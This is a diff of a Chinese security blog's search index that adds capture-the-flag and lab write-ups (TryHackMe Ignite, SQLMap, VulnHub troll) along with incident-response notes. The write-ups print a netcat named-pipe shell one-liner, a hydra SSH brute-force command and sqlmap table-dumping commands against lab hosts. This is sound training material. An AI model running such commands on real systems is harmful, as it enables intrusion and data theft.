@@ -4,6 +4,139 @@
   
     
     <entry>
+      <title>tryhackme-Pickle Rick wp</title>
+      <link href="/2025/03/21/tryhackme-Pickle-Rick-wp/"/>
+      <url>/2025/03/21/tryhackme-Pickle-Rick-wp/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一个简单的小练习</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> tryhackme linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>tryhackme-Ignite靶场wp</title>
+      <link href="/2025/03/21/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/"/>
+      <url>/2025/03/21/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>总算是解决了openvpn连接的问题 开始来打靶场</p><p>从简单的Ignite开始</p><p>首先访问靶场ip会发现是个cms的网站</p><p><img src="/images/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/fuel.png" alt="wang"></p><p>用nmap去扫描会发现有一个文件引起了我们的注意</p><p><img src="/images/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/nmap.png" alt="wang"></p><p>浏览那个网站会发现是一个登录界面 随便用一个弱密码admin:admin 居然等进去了</p><p><img src="/images/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/login.png" alt="wang"></p><p>找不到东西 只能去找找有什么漏洞吗</p><p><img src="/images/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/loudong.png" alt="wang"></p><p>用第三个漏洞</p><p><img src="/images/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/liyong.png" alt="wang"></p><p>成功攻进去 我们进去看看有什么信息吗</p><p>没啥头绪 只能去看看网站有啥信息吗</p><p><img src="/images/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/tip.png" alt="wang"></p><p>访问第二个高亮的文本就是藏着用户账户密码的地方</p><p><img src="/images/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/user.png" alt="wang"></p><p>但这个命令行太不方便了 我用反弹shell来连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2&gt;&amp;1 | nc -l 0.0.0.0 8080 &gt; /tmp/f</span><br><span class="line"></span><br><span class="line">nc -nv TARGET_IP 8080</span><br></pre></td></tr></table></figure><p><img src="/images/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/fantan.png" alt="wang"></p><p>连接上之后就找找flag在哪 其实可用find来找的 但也不知道是不是用flag命名 只能随便逛逛 在&#x2F;home中找到www-data 和我们登录的用户名一模一样 进去找到第一个flag</p><p><img src="/images/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/flag1.png" alt="wang"></p><p>前面知道了root账户和密码 就用su root来提权</p><p>但发现只能是交互式终端才能提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/tryhackme-Ignite%E9%9D%B6%E5%9C%BAwp/root.png" alt="wang"></p><p>进入root目录就能找到root的flag</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> tryhackme linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>DC-1-vulnhub-解法</title>
+      <link href="/2025/03/17/DC-1-vulnhub-%E8%A7%A3%E6%B3%95/"/>
+      <url>/2025/03/17/DC-1-vulnhub-%E8%A7%A3%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>dc-1 靶场</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> vulnhub linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>troll-vulnhub-解法</title>
+      <link href="/2025/03/16/troll-vulnhub-%E8%A7%A3%E6%B3%95/"/>
+      <url>/2025/03/16/troll-vulnhub-%E8%A7%A3%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天来做做这个troll的靶场</p><p>遇事不决就是nmap一顿扫</p><p><img src="/source/images/troll-vulnhub-%E8%A7%A3%E6%B3%95/nmap.png" alt="nmap"></p><p>发现ftp有个匿名登录的账户 我们登进去看看有什么东西吗</p><p><img src="/source/images/troll-vulnhub-%E8%A7%A3%E6%B3%95/lol.png" alt="nmap"></p><p>发现了一个pcap流量包 下载过来检查一下 里面绝对有线索</p><p>在里面发现是ftp在传送一个文本文件的过程 找到了文本文件的内容</p><p><img src="/source/images/troll-vulnhub-%E8%A7%A3%E6%B3%95/sup.png" alt="nmap"></p><p>目前还不清楚这个是干什么的 先留着</p><p>先进网站看看什么个情况 </p><p><img src="/source/images/troll-vulnhub-%E8%A7%A3%E6%B3%95/tu.png" alt="nmap"> </p><p>是个表情包 把我们刚找到的那个字符输进去当路径看看</p><p>好家伙 真是这样</p><p><img src="/source/images/troll-vulnhub-%E8%A7%A3%E6%B3%95/rol.png" alt="nmap"> </p><p>把这个文件下载下来看看 但在linux中是个乱码 拉到Windows里面看看</p><p><img src="/source/images/troll-vulnhub-%E8%A7%A3%E6%B3%95/0x.png" alt="nmap"></p><p>好好好 发现了一个文件路径 打开之后分别是这两个文本文件貌似是个密码本还是啥</p><p><img src="/source/images/troll-vulnhub-%E8%A7%A3%E6%B3%95/ps.png" alt="nmap"></p><p><img src="/source/images/troll-vulnhub-%E8%A7%A3%E6%B3%95/gl.png" alt="nmap"></p><p>就照着这里面的密码根本解不出来 把这个图一的文件名也拉进去 文件名都说了“这个文件夹中包含密码”</p><p>用来破解ssh 加上-t参数 这个破解没加参数的话会被限制 没法破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L pass.txt -P pass.txt 61.139.2.150 ssh -t 3</span><br></pre></td></tr></table></figure><p><img src="/source/images/troll-vulnhub-%E8%A7%A3%E6%B3%95/ssh.png" alt="nmap"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> vulnhub linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>tryhackme-事件响应基础知识</title>
+      <link href="/2025/03/15/tryhackme-%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
+      <url>/2025/03/15/tryhackme-%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/source/images/tryhackme-%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/title.png" alt="title"><br>学习目标</p><ul><li>概述事件及其严重程度</li><li>常见事件类型</li><li>SANS 和NIST框架中的事件响应阶段</li><li>事件检测和响应工具以及 PlayBooks 的作用</li><li>事件响应计划</li></ul><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><p>误报(False positive)：安全解决方案对大量数据从一个系统传输到外部 IP 地址发出警报。在分析此警报后，安全团队发现，此系统正在备份到云存储服务，这导致了此情况。这被称为误报。</p><p>真阳性(True Positive)：安全解决方案对针对组织用户之一的网络钓鱼尝试发出警报。在分析此警报后，安全团队发现该电子邮件是发送给此用户的钓鱼电子邮件，目的是危害系统。这被称为真阳性。</p><p>真正的积极警报有时被称为事件(Incident)。</p><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><p>事故类型</p><p>恶意软件感染(Malware Infections)：恶意软件是一种可能破坏系统、网络或应用程序的恶意程序。大多数事件都与恶意软件感染有关。  恶意软件有多种类型，每种类型都有造成破坏的独特潜力。恶意软件感染主要由文件引起，这些文件可以是文本、文档、可执行文件等。<br>被触手包围的计算机。</p><p>安全漏洞(Security Breaches)：当未经授权的人访问机密数据（我们不希望他们看到或拥有的数据）时，就会出现安全漏洞。 安全漏洞至关重要，因为许多企业都依赖其机密数据，而这些数据必须只有授权人员才能访问。<br>攻击者未经授权访问计算机数据</p><p>数据泄露(Data Leaks)：数据泄露是指个人或组织的机密信息被泄露给未经授权的实体的事件。许多攻击者利用数据泄露损害受害者的声誉，或使用这种技术威胁受害者并从他们那里获取他们需要的东西。与安全漏洞不同，数据泄露也可能是由人为错误或配置错误无意造成的。<br>数据从计算机泄露。</p><p>内部攻击(Insider Attacks)：来自组织内部的事件被称为内部攻击。想象一下，一名心怀不满的员工在最后一天通过 USB 感染了整个网络。这些攻击可能很危险，因为内部人员总是比外部人员更容易获得资源。<br>攻击者被视为全体员工之间的内部人员。</p><p>拒绝服务攻击(Denial Of Service Attacks)：可用性是网络安全的三大支柱之一。防御性安全解决方案和人员不断寻找保护信息的方法；他们确保数据同时可供人们使用。这是因为保护我们无法使用的东西是没有意义的。拒绝服务攻击或DoS攻击是攻击者用虚假请求淹没系统&#x2F;网络&#x2F;应用程序，最终使合法用户无法使用的事件。这是由于可用于处理请求的资源耗尽而发生的。</p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><p>事件响应流程<br>SANS 和NIST是致力于网络安全的知名组织。SANS 提供各种网络安全课程和认证，NIST在制定网络安全标准和指南方面发挥了重要作用。SANS 和NIST 的事件响应框架非常相似。</p><p>SANS 事件响应框架有 6 个阶段，为了容易记住，可以将其称为“PICERL”。</p><table><thead><tr><th>阶段</th><th>解释</th><th>例子</th></tr></thead><tbody><tr><td><strong>准备</strong></td><td>这是第一阶段。准备阶段包括建立处理事件所需的资源。这些资源包括组建事件响应团队、制定适当的事件响应计划以及部署必要的安全解决方案来应对事件。</td><td>对员工进行网络钓鱼电子邮件意识培训。网络钓鱼电子邮件是恶意攻击者发送的欺诈性电子邮件，可以诱骗您执行可能导致事件的操作。</td></tr><tr><td><strong>鉴别</strong></td><td>识别阶段是指寻找可能预示事件的任何异常行为。这涉及使用各种安全解决方案和技术来监控异常事件。</td><td>安全团队注意到其中一台主机发出了大量数据。经分析发现，该主机是在从钓鱼电子邮件附件中下载恶意文件后遭到入侵的。</td></tr><tr><td><strong>遏制</strong></td><td>一旦发现事件，下一步应该是遏制它。这意味着尽量减少攻击的影响。这通常是通过隔离受害机器、禁用受感染的用户帐户等方式来实现的。</td><td>安全团队将主机与网络隔离，以最大限度地减少影响，并且不允许攻击者利用受感染的主机跳转到其他系统。</td></tr><tr><td><strong>根除</strong></td><td>此阶段涉及从受攻击环境中清除威胁。威胁可以是任何类型的。根除阶段将确保受攻击环境干净，现在我们可以进入恢复阶段。</td><td>对系统执行了深度恶意软件扫描，以从主机中删除恶意软件。</td></tr><tr><td><strong>恢复</strong></td><td>恢复阶段是这一链中非常重要的部分。它涉及从备份中恢复受影响的系统或重建它们。然后对恢复的系统进行测试并准备使用。</td><td>被入侵的主机被重新配置，被窃取的数据从备份中恢复。</td></tr><tr><td><strong>经验教训</strong></td><td>这是事件响应生命周期的重要部分。识别并记录事件检测和分析中的差距，有助于改进未来事件的整体流程。</td><td>召开事后审查会议，分析事件的根本原因并改进安全性，以防止将来再次发生攻击。</td></tr></tbody></table><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><p>事件响应技术<br>下面简要介绍其中一些解决方案：</p><ul><li><p>SIEM：安全信息和事件管理解决方案 ( SIEM ) 将所有重要日志收集到一个集中位置，并将它们关联起来以识别事件。</p></li><li><p>AV：防病毒软件 ( AV ) 可检测系统中已知的恶意程序并定期扫描系统以查找这些程序。</p></li><li><p>EDR：端点检测和响应（ EDR）部署在每个系统上，保护系统免受一些高级威胁。该解决方案还可以遏制和消除威胁。</p></li></ul>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 响应 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>tryhackme-SQLMap：基础知识</title>
+      <link href="/2025/03/15/tryhackme-SQLMap%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
+      <url>/2025/03/15/tryhackme-SQLMap%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/images/tryhackme-SQLMap%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/title.png" alt="titile"></p><p>–help带有SQLMap的命令将列出您可以使用的所有可用标志。如果您不想手动将标志添加到每个命令，</p><p>请使用–wizard。当使用此标志时，该工具将指导完成每个步骤并询问问题以完成扫描，使其成为初学者的完美选择。</p><p>–dbs可帮助您提取所有数据库名称</p><p>-D database_name –tables提取有关该数据库表的信息</p><p>如果要枚举这些表中的记录，可以使用-D database_name -T table_name –dump</p><p><img src="/images/tryhackme-SQLMap%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/task3.png" alt="task2"></p><p>来实践一下 简单用法</p><p><img src="/images/tryhackme-SQLMap%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/task4.png" alt="task2"></p><p>第一问 用–dbs参数来看详细的数据库数目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://10.10.158.92/ai/includes/user_login?email=test&amp;password=test&#x27; --dbs --level=5</span><br></pre></td></tr></table></figure><p><img src="/images/tryhackme-SQLMap%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/taskdbs.png" alt="task"></p><p>第二问 需要用–tables -D ‘ai’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://10.10.158.92/ai/includes/user_login?email=test&amp;password=test&#x27; --tables -D &#x27;ai&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/tryhackme-SQLMap%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/user.png" alt="task"></p><p>第三问 –dump -T “user” -D “ai”  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://10.10.158.92/ai/includes/user_login?email=test&amp;password=test&#x27; --dump -T &quot;user&quot; -D &quot;ai&quot; </span><br><span class="line"># -T 加表名 -D 加数据库名</span><br></pre></td></tr></table></figure><p><img src="/images/tryhackme-SQLMap%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/12345678.png" alt="task"></p><p>sqlmap简单到此</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> tryhackme linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>kioptrix-2-vulnhub-解法</title>
+      <link href="/2025/03/15/kioptrix-2-vulnhub-%E8%A7%A3%E6%B3%95/"/>
+      <url>/2025/03/15/kioptrix-2-vulnhub-%E8%A7%A3%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 渗透 linux vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>tryhackme-shell：概括</title>
       <link href="/2025/03/14/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/"/>
       <url>/2025/03/14/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/</url>
@@ -223,7 +356,7 @@
       
         <tags>
             
-            <tag> 渗透 linux </tag>
+            <tag> 渗透 linux vulnhub </tag>
             
         </tags>
       
@@ -653,8 +786,8 @@
     
     <entry>
       <title>about</title>
-      <link href="/about/index.html"/>
-      <url>/about/index.html</url>
+      <link href="/about/index-1.html"/>
+      <url>/about/index-1.html</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       
@@ -675,8 +808,8 @@
     
     <entry>
       <title>about</title>
-      <link href="/about/index-1.html"/>
-      <url>/about/index-1.html</url>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       
@@ -688,17 +821,6 @@
       <title>books</title>
       <link href="/books/index.html"/>
       <url>/books/index.html</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>categories</title>
-      <link href="/categories/index-1.html"/>
-      <url>/categories/index-1.html</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       
@@ -729,9 +851,9 @@
     
     
     <entry>
-      <title>music</title>
-      <link href="/music/index.html"/>
-      <url>/music/index.html</url>
+      <title>categories</title>
+      <link href="/categories/index-1.html"/>
+      <url>/categories/index-1.html</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       
@@ -745,6 +867,28 @@
       <url>/css/touming.css</url>
       
         <content type="html"><![CDATA[/* 文章页背景 */.layout_post>#post {  /* 透明度为 0.7 */  background: rgba(255, 255, 255, 0.7);}/* 所有页面背景 */#aside_content .card-widget, #recent-posts>.recent-post-item, .layout_page>div:first-child:not(.recent-posts), .layout_post>#page, .layout_post>#post, .read-mode .layout_post>#post {  /* 透明度为 0.7 */  background: rgba(255, 255, 255, 0.7);}/* 侧边卡片的透明度 */:root {  --card-bg: rgba(255, 255, 255, 0.7);}/* 页脚透明 */#footer {  /* 透明度为 0.7 */  background: rgba(255, 255, 255, 0.7);}]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>movies</title>
+      <link href="/movies/index.html"/>
+      <url>/movies/index.html</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>music</title>
+      <link href="/music/index.html"/>
+      <url>/music/index.html</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       
     </entry>
     
@@ -787,17 +931,6 @@
       <title>tags</title>
       <link href="/tags/index-2.html"/>
       <url>/tags/index-2.html</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>movies</title>
-      <link href="/movies/index.html"/>
-      <url>/movies/index.html</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       
